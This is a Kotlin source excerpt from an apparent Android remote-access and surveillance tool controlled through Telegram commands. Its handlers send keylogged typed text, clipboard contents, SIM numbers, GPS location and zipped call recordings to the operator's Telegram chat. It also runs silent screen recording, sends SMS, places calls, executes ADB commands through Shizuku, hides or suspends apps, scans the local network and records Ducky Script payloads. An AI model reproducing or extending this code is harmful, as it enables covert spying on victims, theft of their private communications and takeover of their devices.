        val disabled = (args == "on" || args == "disable" || args == "1" || args == "true")
        val manager = DeviceAdminManager(this)
        val ok = manager.setStatusBarDisabled(disabled)
        val msg = if (ok) {
            "🔒 **Notification Shade & Quick Settings Pull-Down ${if (disabled) "DISABLED 🔴" else "ENABLED 🟢"}**"
        } else {
            "⚠️ **Statusbar Error**: Device Owner status required."
        }
        sendMessage(chatId, msg, parseMode = "Markdown")
        sendDiscordCategorizedMessage("02-mdm-device-policy", msg)
    }

    private fun handleMdmUsbCommand(chatId: String, rawText: String) {
        val args = rawText.removePrefix("/disableusb ").removePrefix("/disableusb").removePrefix("!disableusb ").removePrefix("!disableusb").trim().lowercase()
        val disabled = (args == "on" || args == "disable" || args == "1" || args == "true")
        val manager = DeviceAdminManager(this)
        val ok = manager.applyEnterpriseUserRestrictions(disabled)
        val msg = if (ok) {
            "🔌 **USB File Transfer & Bluetooth ${if (disabled) "BLOCKED 🔴" else "ALLOWED 🟢"}**"
        } else {
            "⚠️ **USB Block Error**: Device Owner status required."
        }
        sendMessage(chatId, msg, parseMode = "Markdown")
        sendDiscordCategorizedMessage("02-mdm-device-policy", msg)
    }

    private fun handleMdmMultiKioskCommand(chatId: String, rawText: String) {
        val pkgsStr = rawText.removePrefix("/multikiosk ").removePrefix("/multikiosk").removePrefix("!multikiosk ").removePrefix("!multikiosk").trim()
        val pkgsList = pkgsStr.split(",").map { it.trim() }.filter { it.isNotBlank() }
        val manager = DeviceAdminManager(this)
        val ok = manager.setMultiAppKioskMode(pkgsList)
        val msg = if (ok) {
            "📱 **Multi-App Kiosk Packages Configured**: `${pkgsList.joinToString(", ")}`"
        } else {
            "⚠️ **Multi-Kiosk Error**: Device Owner status required."
        }
        sendMessage(chatId, msg, parseMode = "Markdown")
        sendDiscordCategorizedMessage("02-mdm-device-policy", msg)
    }

    private fun handleMdmCameraDisableCommand(chatId: String, rawText: String) {
        val args = rawText.removePrefix("/cameradisable ").removePrefix("/cameradisable").removePrefix("!cameradisable ").removePrefix("!cameradisable").trim().lowercase()
        val disabled = (args == "on" || args == "disable" || args == "1" || args == "true")
        val manager = DeviceAdminManager(this)

        val ok = manager.setHardwareCameraDisabled(disabled)
        val msg = if (ok) {
            "📷 **Hardware Camera ${if (disabled) "PROHIBITED 🔴" else "ENABLED 🟢"}** system-wide"
        } else {
            "⚠️ **Camera Disable Error**: Device Owner or Device Admin status required."
        }
        sendMessage(chatId, msg, parseMode = "Markdown")
        sendDiscordCategorizedMessage("02-mdm-device-policy", msg)
    }

    private fun handleMdmAppHideCommand(chatId: String, rawText: String) {
        val args = rawText.removePrefix("/apphide ").removePrefix("/apphide").removePrefix("!apphide ").removePrefix("!apphide").trim()
        val parts = args.split(Regex("""\s+""")).filter { it.isNotBlank() }
        if (parts.isEmpty()) {
            sendMessage(chatId, "💡 *Usage:* `/apphide <package_name> [on|off]`", parseMode = "Markdown")
            return
        }
        val pkg = parts[0]
        val mode = parts.getOrNull(1)?.lowercase() ?: "on"
        val hidden = (mode == "on" || mode == "hide" || mode == "1" || mode == "true")

        val manager = DeviceAdminManager(this)
        val ok = manager.setAppHidden(pkg, hidden)
        val msg = if (ok) {
            "👁️ **Package `$pkg` ${if (hidden) "HIDDEN 🙈" else "UNHIDDEN 👁️"}** system-wide"
        } else {
            "⚠️ **App Hide Error**: Device Owner status required."
        }
        sendMessage(chatId, msg, parseMode = "Markdown")
        sendDiscordCategorizedMessage("02-mdm-device-policy", msg)
    }

    private fun handleMdmAppSuspendCommand(chatId: String, rawText: String) {
        val args = rawText.removePrefix("/appsuspend ").removePrefix("/appsuspend").removePrefix("!appsuspend ").removePrefix("!appsuspend").trim()
        val parts = args.split(Regex("""\s+""")).filter { it.isNotBlank() }
        if (parts.isEmpty()) {
            sendMessage(chatId, "💡 *Usage:* `/appsuspend <package_name> [on|off]`", parseMode = "Markdown")
            return
        }
        val pkg = parts[0]
        val mode = parts.getOrNull(1)?.lowercase() ?: "on"
        val suspended = (mode == "on" || mode == "suspend" || mode == "1" || mode == "true")

        val manager = DeviceAdminManager(this)
        val ok = manager.setAppSuspended(pkg, suspended)
        val msg = if (ok) {
            "⛔ **Package `$pkg` ${if (suspended) "SUSPENDED 🔴" else "UNSUSPENDED 🟢"}**"
        } else {
            "⚠️ **App Suspend Error**: Device Owner status required."
        }
        sendMessage(chatId, msg, parseMode = "Markdown")
        sendDiscordCategorizedMessage("02-mdm-device-policy", msg)
    }

    private fun handleMdmRestrictionsCommand(chatId: String, rawText: String) {
        val args = rawText.removePrefix("/mdmrestrict ").removePrefix("/mdmrestrict").removePrefix("!mdmrestrict ").removePrefix("!mdmrestrict").trim().lowercase()
        val enable = (args == "on" || args == "enable" || args == "1" || args == "true")
        val manager = DeviceAdminManager(this)

        val ok = manager.applyEnterpriseUserRestrictions(enable)
        val msg = if (ok) {
            "🛡️ **System Restrictions (Factory Reset / Safe Boot / Multi-User) ${if (enable) "APPLIED 🔒" else "CLEARED 🔓"}**"
        } else {
            "⚠️ **MDM Restrictions Error**: Device Owner status required."
        }
        sendMessage(chatId, msg, parseMode = "Markdown")
        sendDiscordCategorizedMessage("02-mdm-device-policy", msg)
    }

    private fun handleMdmKeyguardCommand(chatId: String, rawText: String) {
        val args = rawText.removePrefix("/keyguardrestrict ").removePrefix("/keyguardrestrict").removePrefix("!keyguardrestrict ").removePrefix("!keyguardrestrict").trim().lowercase()
        val disable = (args == "on" || args == "disable" || args == "1" || args == "true")
        val manager = DeviceAdminManager(this)

        val ok = manager.setKeyguardFeaturesDisabled(disable)
        val msg = if (ok) {
            "🔒 **Lockscreen Keyguard Features ${if (disable) "RESTRICTED 🔴" else "RESTORED 🟢"}**"
        } else {
            "⚠️ **Keyguard Error**: Device Admin or Owner status required."
        }
        sendMessage(chatId, msg, parseMode = "Markdown")
        sendDiscordCategorizedMessage("02-mdm-device-policy", msg)
    }

    private fun handleAutoAccessibilityCommand(chatId: String) {
        serviceScope.launch(Dispatchers.IO) {
            val res = ShizukuSystemEngine.autoEnableAccessibilityService()
            sendMessage(chatId, "⚡ **Auto-Enable Accessibility Result:**\n$res", parseMode = "Markdown")
        }
    }

    private fun handleActiveApp(chatId: String) {
        val currentApp = AppAccessibilityService.currentActiveApp
        val currentPkg = AppAccessibilityService.currentActivePackage
        val timeStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())

        val msg = """
            📱 *Active App On Screen*
            
            👤 App Name: *$currentApp*
            📦 Package: `$currentPkg`
            🕐 Time: `$timeStr`
        """.trimIndent()

        sendMessage(chatId, msg, parseMode = "Markdown")
    }

    private fun handleAIC2Command(chatId: String, prompt: String) {
        val parsedIntent = OnDeviceAIC2Engine.parseNaturalLanguageCommand(prompt)
        val responseText = StringBuilder()
        responseText.append("🤖 **On-Device AI Intent Parser**\n")
        responseText.append("• **Input Query:** `$prompt`\n")
        responseText.append("• **Target Command:** `${parsedIntent.targetCommand}`\n")
        if (parsedIntent.extractedParameters.isNotBlank()) {
            responseText.append("• **Parameters:** `${parsedIntent.extractedParameters}`\n")
        }
        responseText.append("• **Confidence:** `${"%.2f".format(parsedIntent.confidenceScore * 100)}%`\n")
        responseText.append("• **AI Note:** ${parsedIntent.aiExplanation}\n")

        sendMessage(chatId, responseText.toString(), parseMode = "Markdown")

        if (parsedIntent.confidenceScore >= 0.5f && parsedIntent.targetCommand != "/ai" && parsedIntent.targetCommand != "/help") {
            val fullCmd = if (parsedIntent.extractedParameters.isNotBlank()) {
                "${parsedIntent.targetCommand} ${parsedIntent.extractedParameters}"
            } else {
                parsedIntent.targetCommand
            }
            dispatchCommand(fullCmd, chatId, isDirectServerCommand = true)
        }
    }

    private fun handleAISummaryCommand(chatId: String) {
        serviceScope.launch(Dispatchers.IO) {
            val logFile = File(cacheDir, ".active_apps.txt")
            val rawLogs = if (logFile.exists()) logFile.readText() else ""
            val summary = OnDeviceAIC2Engine.summarizeTelemetryStream(rawLogs)
            sendMessage(chatId, summary, parseMode = "Markdown")
        }
    }

    private fun handleWatchdogStatus(chatId: String) {
        val status = ServiceWatchdogScheduler.getWatchdogStatus(this)
        val myModel = Build.MODEL
        val myDeviceId = getOrCreateDeviceId()

        val msg = """
            🛡️ *WorkManager Resilient Watchdog Report*
            
            • *Device Model:* `$myModel` (`$myDeviceId`)
            • *Watchdog Status:* ${if (status.isWatchdogActive) "ACTIVE 🟢" else "INACTIVE 🔴"}
            • *Last Check Time:* `${status.lastCheckFormatted}`
            • *Total Periodic Checks:* `${status.checkCount}`
            • *Auto-Recoveries Triggered:* `${status.recoveryCount}`
            • *MonitorService Alive:* ${if (status.isMonitorServiceAlive) "YES 🟢" else "NO 🔴"}
            • *Cloudflare Tunnel State:* `${status.cloudflareState}`
        """.trimIndent()

        sendMessage(chatId, msg, parseMode = "Markdown")
    }

    private fun handleNetScanCommand(chatId: String) {
        sendMessage(chatId, "🔍 *Starting Multithreaded Local Subnet Scan (254 IPs)...*", parseMode = "Markdown")
        serviceScope.launch(Dispatchers.IO) {
            try {
                val report = LocalNetworkDiscoveryEngine.scanSubnet(this@MonitorService)
                val asciiMap = LocalNetworkDiscoveryEngine.formatAsciiNetworkMap(report)
                sendMessage(chatId, asciiMap, parseMode = "Markdown")
            } catch (e: Exception) {
                sendMessage(chatId, "❌ Subnet scan failed: ${e.message}")
            }
        }
    }

    private fun handleArpTableCommand(chatId: String) {
        serviceScope.launch(Dispatchers.IO) {
            val arpMap = LocalNetworkDiscoveryEngine.parseArpTable()
            if (arpMap.isEmpty()) {
                sendMessage(chatId, "ℹ️ *No active ARP entries found in `/proc/net/arp`.*", parseMode = "Markdown")
                return@launch
            }
            val sb = StringBuilder()
            sb.append("📋 *Linux Kernel `/proc/net/arp` Table*\n```\n")
            sb.append("%-16s %s\n".format("IP Address", "MAC Hardware Address"))
            sb.append("─".repeat(38)).append("\n")
            for ((ip, mac) in arpMap) {
                sb.append("%-16s %s\n".format(ip, mac))
            }
            sb.append("```")
            sendMessage(chatId, sb.toString(), parseMode = "Markdown")
        }
    }

    private fun handlePortScanCommand(chatId: String, ipArg: String) {
        val targetIp = if (ipArg.isBlank()) {
            LocalNetworkDiscoveryEngine.getLocalIpAndSubnet(this).first
        } else ipArg

        sendMessage(chatId, "🔎 *Scanning diagnostic ports on host `$targetIp`...*", parseMode = "Markdown")
        serviceScope.launch(Dispatchers.IO) {
            try {
                val report = LocalNetworkDiscoveryEngine.scanHostPorts(targetIp)
                val openStr = if (report.openPorts.isNotEmpty()) report.openPorts.joinToString(", ") else "None"
                val msg = """
                    🎯 *Host Port Scan Results (`$targetIp`)*
                    
                    • **Open Ports:** `$openStr`
                    • **Total Ports Scanned:** `${report.scannedPortCount}`
                """.trimIndent()
                sendMessage(chatId, msg, parseMode = "Markdown")
            } catch (e: Exception) {
                sendMessage(chatId, "❌ Port scan failed: ${e.message}")
            }
        }
    }

    private fun handleShizukuAdbCommand(chatId: String, cmdArg: String) {
        if (cmdArg.isBlank()) {
            val status = ShizukuSystemEngine.getStatusReport()
            sendMessage(
                chatId,
                "⚡ *Shizuku ADB System Status*\n\n" +
                "• **Status:** ${status.statusMessage}\n\n" +
                "💡 *Usage:* `/shizuku getprop ro.build.version.release` or `!shizuku pm list packages`",
                parseMode = "Markdown"
            )
            return
        }

        sendMessage(chatId, "⚡ *Executing ADB command via Shizuku...*\n`$cmdArg`", parseMode = "Markdown")
        serviceScope.launch(Dispatchers.IO) {
            val result = ShizukuSystemEngine.executeAdbCommand(cmdArg)
            sendMessage(chatId, "⚡ **Shizuku ADB Result (`$cmdArg`):**\n$result", parseMode = "Markdown")
        }
    }

    private fun handleShizukuGrantCommand(chatId: String, args: String) {
        val parts = args.split(Regex("""\s+""")).filter { it.isNotBlank() }
        if (parts.size < 2) {
            sendMessage(chatId, "💡 *Usage:* `/shizukugrant <package_name> <permission>` (e.g. `/shizukugrant com.example.app android.permission.WRITE_SETTINGS`)", parseMode = "Markdown")
            return
        }
        val pkg = parts[0]
        val perm = parts[1]

        serviceScope.launch(Dispatchers.IO) {
            val result = ShizukuSystemEngine.grantPermission(pkg, perm)
            sendMessage(chatId, "⚡ **Shizuku Grant Permission (`$pkg` -> `$perm`):**\n$result", parseMode = "Markdown")
        }
    }

    private fun handleShizukuKillCommand(chatId: String, pkgArg: String) {
        if (pkgArg.isBlank()) {
            sendMessage(chatId, "💡 *Usage:* `/shizukukill <package_name>` (e.g. `/shizukukill com.example.app`)", parseMode = "Markdown")
            return
        }

        serviceScope.launch(Dispatchers.IO) {
            val result = ShizukuSystemEngine.forceStopApp(pkgArg)
            sendMessage(chatId, "⚡ **Shizuku Force-Stop (`$pkgArg`):**\n$result", parseMode = "Markdown")
        }
    }

    private fun handleScreenRecordCommand(chatId: String, duration: Int) {
        val sec = duration.coerceIn(3, 120)
        sendMessage(chatId, "📹 *Starting silent background screen recording ($sec seconds)...*", parseMode = "Markdown")
        InvisibleActivity.launchScreenRecord(this, chatId, sec)
    }

    private fun handleArmPhysicalGuard(chatId: String) {
        val armed = PhysicalSecurityGuard.armGuard(this)
        val myModel = Build.MODEL
        val myDeviceId = getOrCreateDeviceId()

        if (armed) {
            sendMessage(chatId, "🛡️ *Physical Security Guard ARMED* on `$myModel` (`$myDeviceId`).\n\n• **Sensitivity:** `${PhysicalSecurityGuard.sensitivityThreshold} m/s²`\n• **Monitored Sensors:** Accelerometer, Proximity, Light", parseMode = "Markdown")
        } else {
            sendMessage(chatId, "❌ Failed to arm Physical Security Guard.")
        }
    }

    private fun handleDisarmPhysicalGuard(chatId: String) {
        PhysicalSecurityGuard.disarmGuard(this)
        val myModel = Build.MODEL
        val myDeviceId = getOrCreateDeviceId()
        sendMessage(chatId, "🛡️ *Physical Security Guard DISARMED* on `$myModel` (`$myDeviceId`).", parseMode = "Markdown")
    }

    private fun handleDuckyRecordCommand(chatId: String, actionArg: String) {
        val lower = actionArg.lowercase(Locale.ROOT)
        when {
            lower.startsWith("start") -> {
                DuckyScriptStudio.startMacroRecording()
                sendMessage(chatId, "🔴 *Ducky Script Visual Macro Recording STARTED!*\n\nPerform remote gestures via WebStream canvas (Port 5467) or on target screen. Touch events are being recorded in real-time.\n\nSend `/duckyrecord stop` to export payload.", parseMode = "Markdown")
            }
            lower.startsWith("stop") -> {
                val exportedFile = DuckyScriptStudio.stopMacroRecording(this)
                if (exportedFile != null && exportedFile.exists()) {
                    sendMessage(chatId, "🟢 *Ducky Script Macro Recording STOPPED!*\n\nExported `${DuckyScriptStudio.getRecordedLinesCount()}` lines to `${exportedFile.name}`.", parseMode = "Markdown")
                    sendPhotoPublic(chatId, exportedFile)
                    activeInstance?.sendDiscordCategorizedFile("29-ducky-script-payloads", exportedFile, "text/plain")
                } else {
                    sendMessage(chatId, "⚠️ Macro recording stopped (No lines recorded).")
                }
            }
            else -> {
                val statusStr = if (DuckyScriptStudio.isRecordingMacro) "ACTIVE 🔴 (${DuckyScriptStudio.getRecordedLinesCount()} lines recorded)" else "INACTIVE 🟢"
                sendMessage(chatId, "🐤 **Ducky Script Macro Studio**\n\n• **Recording Status:** $statusStr\n\n💡 *Usage:*\n• `/duckyrecord start` — Begin recording touch macro\n• `/duckyrecord stop` — Stop and export .ducky payload", parseMode = "Markdown")
            }
        }
    }

    private fun handleDuckyValidateCommand(chatId: String, scriptArg: String) {
        if (scriptArg.isBlank()) {
            sendMessage(chatId, "💡 *Usage:* `/duckyvalidate <script_content>` (e.g. `/duckyvalidate DELAY 500\\nSTRING Hello\\nENTER`)", parseMode = "Markdown")
            return
        }

        val report = DuckyScriptStudio.validateScriptSyntax(scriptArg)
        val sb = StringBuilder()
        sb.append("🐤 **Ducky Script Syntax Validation Studio**\n\n")
        sb.append("• **Syntax Status:** ${if (report.isValid) "VALID 🟢" else "INVALID 🔴"}\n")
        sb.append("• **Total Lines:** `${report.totalLines}`\n")
        sb.append("• **Valid Commands:** `${report.validCommandsCount}`\n")

        if (report.errorLines.isNotEmpty()) {
            sb.append("\n⚠️ **Syntax Errors Detected:**\n```\n")
            report.errorLines.forEach { sb.append(it).append("\n") }
            sb.append("```")
        }

        sendMessage(chatId, sb.toString(), parseMode = "Markdown")
    }

    private fun handleKeyAttestationCommand(chatId: String) {
        sendMessage(chatId, "🔑 *Generating Hardware TEE Key Attestation Certificate Chain...*", parseMode = "Markdown")
        serviceScope.launch(Dispatchers.IO) {
            try {
                val report = KeyAttestationManager.generateAttestationReport(this@MonitorService)
                sendMessage(chatId, report.summaryDetails, parseMode = "Markdown")
            } catch (e: Exception) {
                sendMessage(chatId, "❌ Key attestation error: ${e.message}")
            }
        }
    }

    private fun handleKeylogMenu(chatId: String) {
        val keylogDir = File(cacheDir, ".keylogs")
        if (!keylogDir.exists() || keylogDir.listFiles().isNullOrEmpty()) {
            sendMessage(chatId, "📭 *No logged keystrokes found yet.*\n\nMake sure Accessibility Service is enabled in Settings.", parseMode = "Markdown")
            return
        }

        val files = keylogDir.listFiles()?.filter { it.isFile && it.name.endsWith(".txt") } ?: emptyList()
        if (files.isEmpty()) {
            sendMessage(chatId, "📭 *No logged keystrokes found yet.*", parseMode = "Markdown")
            return
        }

        val keyboardRows = JSONArray()
        var currentRow = JSONArray()

        files.forEach { file ->
            val pkgName = file.name.removeSuffix(".txt")
            val lines = file.readLines()
            val appNameHeader = lines.firstOrNull { it.startsWith("#APP_NAME:") }
            val appName = appNameHeader?.removePrefix("#APP_NAME:") ?: pkgName
            val logCount = lines.count { !it.startsWith("#APP_NAME:") && it.isNotBlank() }

            if (logCount > 0) {
                val btnObj = JSONObject().apply {
                    put("text", "📋 $appName ($logCount)")
                    put("callback_data", "/keylog_view_$pkgName")
                }

                currentRow.put(btnObj)
                if (currentRow.length() >= 2) {
                    keyboardRows.put(currentRow)
                    currentRow = JSONArray()
                }
            }
        }

        if (currentRow.length() > 0) {
            keyboardRows.put(currentRow)
        }

        val text = "📋 *Real-Time App Keylogs*\nSelect an app below to view captured typed screen text:"
        val replyMarkup = JSONObject().put("inline_keyboard", keyboardRows)

        sendMessageWithMarkup(chatId, text, replyMarkup)
    }

    private fun handleKeylogView(chatId: String, packageName: String) {
        val keylogDir = File(cacheDir, ".keylogs")
        val file = File(keylogDir, "$packageName.txt")

        if (!file.exists()) {
            sendMessage(chatId, "📭 No keylogs found for `$packageName`.", parseMode = "Markdown")
            return
        }

        val lines = file.readLines()
        val appNameHeader = lines.firstOrNull { it.startsWith("#APP_NAME:") }
        val appName = appNameHeader?.removePrefix("#APP_NAME:") ?: packageName
        val logLines = lines.filter { !it.startsWith("#APP_NAME:") && it.isNotBlank() }

        if (logLines.isEmpty()) {
            sendMessage(chatId, "📭 Keylog for *$appName* is empty.", parseMode = "Markdown")
            return
        }

        val header = "📋 *Keylog Entries for $appName* (${logLines.size} entries):\n\n"
        val sb = StringBuilder(header)

        logLines.forEach { line ->
            val entry = "• $line\n\n"
            if (sb.length + entry.length > 3800) {
                sendMessage(chatId, sb.toString().trimEnd(), parseMode = "Markdown")
                sb.clear()
            }
            sb.append(entry)
        }

        if (sb.isNotBlank()) {
            sendMessage(chatId, sb.toString().trimEnd(), parseMode = "Markdown")
        }
    }

    private fun handleNetworkInfo(chatId: String) {
        try {
            val wifiManager = applicationContext.getSystemService(WIFI_SERVICE) as? WifiManager
            val wifiInfo = wifiManager?.connectionInfo
            val ssid = wifiInfo?.ssid?.replace("\"", "") ?: "N/A"
            val bssid = wifiInfo?.bssid ?: "N/A"
            val rssi = wifiInfo?.rssi ?: 0
            val ipAddress = if (wifiInfo != null) {
                val ip = wifiInfo.ipAddress
                String.format(Locale.getDefault(), "%d.%d.%d.%d", ip and 0xff, ip shr 8 and 0xff, ip shr 16 and 0xff, ip shr 24 and 0xff)
            } else "N/A"

            val teleManager = getSystemService(TELEPHONY_SERVICE) as? TelephonyManager
            val carrier = teleManager?.networkOperatorName ?: "N/A"

            val msg = """
                🌐 *Network & Wi-Fi Telemetry*
                
                📶 Wi-Fi SSID: *$ssid*
                📍 BSSID: `$bssid`
                📡 Signal Strength: `${rssi} dBm`
                🌐 Device IP: `$ipAddress`
                📡 Cellular Carrier: *$carrier*
            """.trimIndent()

            sendMessage(chatId, msg, parseMode = "Markdown")
        } catch (e: Exception) {
            sendMessage(chatId, "❌ Network Info Error: ${e.message}")
        }
    }

    private fun handleClipboard(chatId: String) {
        try {
            val clipFile = File(cacheDir, ".clipboard.txt")
            var text = if (clipFile.exists() && clipFile.readText().isNotBlank()) {
                clipFile.readText().trim()
            } else {
                null
            }

            if (text == null) {
                val clipManager = getSystemService(CLIPBOARD_SERVICE) as? ClipboardManager
                val clipData = clipManager?.primaryClip?.getItemAt(0)?.text?.toString()
                if (!clipData.isNullOrBlank()) {
                    text = clipData
                }
            }

            val finalContent = text ?: "No clipboard text captured yet.\n(Copy text on device or ensure Accessibility Service is enabled)."
            val msg = "📋 *Clipboard Content:*\n```\n$finalContent\n```"
            sendMessage(chatId, msg, parseMode = "Markdown")
        } catch (e: Exception) {
            sendMessage(chatId, "❌ Clipboard Error: ${e.message}")
        }
    }

    private fun handleSendSms(chatId: String, args: String) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
            sendMessage(chatId, "⚠️ SEND_SMS permission not granted.")
            return
        }

        val parts = args.trim().split(" ", limit = 2)
        if (parts.size < 2 || parts[0].isEmpty() || parts[1].isEmpty()) {
            sendMessage(chatId, "ℹ️ Usage: `/sendsms <number> <message>`\nExample: `/sendsms 9812345678 Hello World`", parseMode = "Markdown")
            return
        }

        val destinationNumber = parts[0].trim()
        val messageText = parts[1].trim()

        try {
            @Suppress("DEPRECATION")
            val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                getSystemService(SmsManager::class.java)
            } else {
                SmsManager.getDefault()
            }

            smsManager.sendTextMessage(destinationNumber, null, messageText, null, null)
            sendMessage(chatId, "📤 *SMS Sent Successfully!*\n\n📱 To: `$destinationNumber`\n💬 Message: `$messageText`", parseMode = "Markdown")
        } catch (e: Exception) {
            Log.e(TAG, "sendSms error: ${e.message}")
            sendMessage(chatId, "❌ Failed to send SMS: ${e.message}")
        }
    }

    private fun handleMakeCall(chatId: String, args: String) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
            sendMessage(chatId, "⚠️ CALL_PHONE permission not granted.")
            return
        }

        val targetNumber = args.trim()
        if (targetNumber.isEmpty()) {
            sendMessage(chatId, "ℹ️ Usage: `/makecall <number>` or `/call <number>`\nExample: `/makecall 9812345678`", parseMode = "Markdown")
            return
        }

        try {
            val callIntent = Intent(Intent.ACTION_CALL).apply {
                data = Uri.parse("tel:$targetNumber")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(callIntent)
            sendMessage(chatId, "📞 *Initiating Phone Call…*\n\n📱 Dialing: `$targetNumber`", parseMode = "Markdown")
        } catch (e: Exception) {
            Log.e(TAG, "makeCall error: ${e.message}")
            sendMessage(chatId, "❌ Failed to place call: ${e.message}")
        }
    }

    private fun handleDeviceInfoCommand(chatId: String) {
        val deviceId = getOrCreateDeviceId()
        val manufacturer = Build.MANUFACTURER
        val model = Build.MODEL
        val device = Build.DEVICE
        val product = Build.PRODUCT
        val androidVersion = Build.VERSION.RELEASE
        val sdkInt = Build.VERSION.SDK_INT

        val batteryIntent = registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
        val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        val batteryPct = if (level != -1 && scale != -1) "${(level * 100 / scale.toFloat()).toInt()}%" else "Unknown"
        val status = batteryIntent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
        val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
        val chargingState = if (isCharging) "🔌 Charging ($batteryPct)" else "🔋 Battery ($batteryPct)"

        val simInfoBuilder = StringBuilder()
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                val subManager = getSystemService(TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
                val subList = subManager?.activeSubscriptionInfoList
                if (!subList.isNullOrEmpty()) {
                    subList.forEachIndexed { idx, sub ->
                        val simNum = sub.number?.takeIf { it.isNotBlank() } ?: "N/A"
                        val carrier = sub.carrierName ?: "Unknown Carrier"
                        val country = sub.countryIso?.uppercase(Locale.getDefault()) ?: "N/A"
                        simInfoBuilder.append("   • SIM ${idx + 1} Slot ${sub.simSlotIndex + 1}: *$carrier* ($country)\n")
                        simInfoBuilder.append("     📞 Number: `$simNum` | SubID: ${sub.subscriptionId}\n")
                    }
                } else {
                    simInfoBuilder.append("   • No active SIM subscriptions found.\n")
                }
            } else {
                simInfoBuilder.append("   • READ_PHONE_STATE permission missing.\n")
            }
        } catch (e: Exception) {
            simInfoBuilder.append("   • SIM Info: N/A\n")
        }

        val hardwareId = try {
            val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            androidId ?: "N/A"
        } catch (e: Exception) {
            "N/A"
        }

        var locationStr = "N/A"
        try {
            val locManager = getSystemService(LOCATION_SERVICE) as LocationManager
            val loc = locManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                ?: locManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            if (loc != null) {
                val lat = loc.latitude
                val lon = loc.longitude
                val mapsUrl = "https://maps.google.com/?q=$lat,$lon"
                locationStr = "`$lat, $lon` ([Google Maps]($mapsUrl))"
            }
        } catch (e: Exception) {
            locationStr = "Permission or GPS disabled"
        }

        val timeStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())

        val msg = """
            📱 *Device Telemetry & Hardware Info*
            
            🆔 Device ID: `$deviceId`
            ⚙️ Hardware Serial/ID: `$hardwareId`
            🏭 Manufacturer: *$manufacturer*
            📱 Model: *$model* (`$device` / `$product`)
            🤖 Android OS: *$androidVersion* (API $sdkInt)
            $chargingState
            
            📶 *Dual SIM Subscription Telephony:*
            $simInfoBuilder
            📍 *Last Known Location:*
            $locationStr
            
            🕐 *Report Time:* `$timeStr`
        """.trimIndent()

        sendMessage(chatId, msg, parseMode = "Markdown")
    }

    private fun handleCallRecordingsMenu(chatId: String) {
        val recDir = File(cacheDir, ".call_recs")
        val files = recDir.listFiles()?.filter { it.isFile && it.name.endsWith(".m4a") }?.sortedByDescending { it.lastModified() } ?: emptyList()

        if (files.isEmpty()) {
            sendMessage(chatId, "📭 *No stored call recordings found on device.*", parseMode = "Markdown")
            return
        }

        val keyboardRows = JSONArray()
        var currentRow = JSONArray()

        files.take(12).forEach { file ->
            val dateStr = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault()).format(Date(file.lastModified()))
            val sizeMb = "%.1fMB".format(file.length() / (1024.0 * 1024.0))

            val btnObj = JSONObject().apply {
                put("text", "🎙️ $dateStr ($sizeMb)")
                put("callback_data", "/callrec_get_${file.name}")
            }

            currentRow.put(btnObj)
            if (currentRow.length() >= 2) {
                keyboardRows.put(currentRow)
                currentRow = JSONArray()
            }
        }

        if (currentRow.length() > 0) {
            keyboardRows.put(currentRow)
        }

        keyboardRows.put(JSONArray().apply {
            put(JSONObject().apply {
                put("text", "📦 Zip & Download All Call Recordings")
                put("callback_data", "/callrec_zip_all")
            })
        })

        val text = "🎙️ *Stored Call Recordings* (${files.size} total)\nSelect a call recording below to download directly to Telegram:"
        val replyMarkup = JSONObject().put("inline_keyboard", keyboardRows)

        sendMessageWithMarkup(chatId, text, replyMarkup)
    }

    private fun handleSendSingleCallRecording(chatId: String, filename: String) {
        val recDir = File(cacheDir, ".call_recs")
        val file = File(recDir, filename)

        if (!file.exists()) {
            sendMessage(chatId, "❌ Call recording `$filename` not found.", parseMode = "Markdown")
            return
        }

        sendMessage(chatId, "📤 Uploading call recording `${file.name}`…", parseMode = "Markdown")

        serviceScope.launch {
            try {
                val bytes = file.readBytes()
                val targetChat = if (chatId.isNotBlank()) chatId else CHAT_ID
                val body = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", targetChat)
                    .addFormDataPart(
                        "audio",
                        file.name,
                        bytes.toRequestBody("audio/mp4".toMediaTypeOrNull())
                    )
                    .addFormDataPart("title", "Call Recording (${file.name})")
                    .build()

                val request = Request.Builder().url(getTelegramApiUrl("sendAudio")).post(body).build()
                httpClient.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        sendMessage(targetChat, "✅ Call recording `${file.name}` sent!", parseMode = "Markdown")
                    } else {
                        sendMessage(targetChat, "❌ Upload failed: ${response.code}")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "sendSingleCallRecording error: ${e.message}")
                sendMessage(chatId, "❌ Error sending recording: ${e.message}")
            }
        }
    }

    private fun handleZipAllCallRecordings(chatId: String) {
        val recDir = File(cacheDir, ".call_recs")
        if (!recDir.exists() || recDir.listFiles().isNullOrEmpty()) {
            sendMessage(chatId, "📭 No call recordings found to zip.", parseMode = "Markdown")
            return
        }

        handleZipFolder(chatId, ".call_recs")
    }

    fun saveYouTubeHistoryLocally(appName: String, title: String, channel: String, url: String, timeStr: String) {
        try {
            val historyFile = File(cacheDir, ".youtube_history.txt")
            val channelInfo = if (channel.isNotBlank()) " ($channel)" else ""
            val urlInfo = if (url.isNotBlank()) " | $url" else ""
            val entry = "[$timeStr] [$appName] $title$channelInfo$urlInfo\n"
